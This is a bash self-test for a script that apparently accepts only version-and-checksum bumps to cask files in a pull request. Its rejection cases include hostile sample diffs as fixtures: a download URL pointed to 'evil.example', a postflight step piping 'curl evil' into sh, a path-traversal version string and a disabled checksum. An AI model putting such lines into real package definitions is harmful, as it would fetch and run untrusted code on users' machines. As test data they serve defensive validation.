#!/usr/bin/env bash
# Self-check for bump-only.sh: run `.github/scripts/bump-only_test.sh`.
set -euo pipefail
cd "$(dirname "$0")"

h1=$(printf 'a%.0s' {1..64})
h2=$(printf 'b%.0s' {1..64})
fails=0

check() { # expected(0 accept/1 reject) name json
  local got=0
  ./bump-only.sh <<<"$3" || got=1
  if [ "$got" != "$1" ]; then echo "FAIL: $2"; fails=$((fails + 1)); fi
}
file() { # filename status patch
  jq -n --arg f "$1" --arg s "$2" --arg p "$3" '{filename: $f, status: $s, patch: $p}'
}

single=$(file Casks/x.rb modified "@@ -1,3 +1,3 @@
 cask \"x\" do
-  version \"2026-10-12\"
-  sha256 \"$h1\"
+  version \"2026-10-13\"
+  sha256 \"$h2\"")
arch=$(file Casks/chairlift.rb modified "@@ -3,6 +3,6 @@
-  version \"26.10.5\"
-  sha256 arm:          \"$h1\",
-         intel:        \"$h1\",
-         arm64_linux:  \"$h1\",
-         x86_64_linux: \"$h1\"
+  version \"26.10.6\"
+  sha256 arm:          \"$h2\",
+         intel:        \"$h2\",
+         arm64_linux:  \"$h2\",
+         x86_64_linux: \"$h2\"")

check 0 "single-arch bump" "[$single]"
check 0 "multi-arch bump" "[$arch]"
check 0 "paginated pages" "[$single] [$arch]"
check 1 "empty file list" "[]"
check 1 "url change" "[$(file Casks/x.rb modified '@@ -1 +1 @@
-  url "https://github.com/a/b/x.tar.gz"
+  url "https://evil.example/x.tar.gz"')]"
check 1 "postflight change" "[$(file Casks/x.rb modified '@@ -1 +1 @@
+    run "/bin/sh", args: ["-c", "curl evil | sh"]')]"
check 1 "path in version" "[$(file Casks/x.rb modified '@@ -1 +1 @@
-  version "1.0"
+  version "../../evil/1.0"')]"
check 1 "no_check sha" "[$(file Casks/x.rb modified '@@ -1 +1 @@
-  sha256 "'"$h1"'"
+  sha256 :no_check')]"
check 1 "workflow file" "[$single, $(file .github/workflows/x.yml modified "@@ -1 +1 @@
+  version \"1.0\"")]"
check 1 "added cask" "[$(file Casks/y.rb added "@@ -0,0 +1 @@
+  version \"1.0\"")]"
check 1 "missing patch" '[{"filename":"Casks/x.rb","status":"modified"}]'

[ "$fails" -eq 0 ] && echo "bump-only: all checks passed"
exit "$fails"
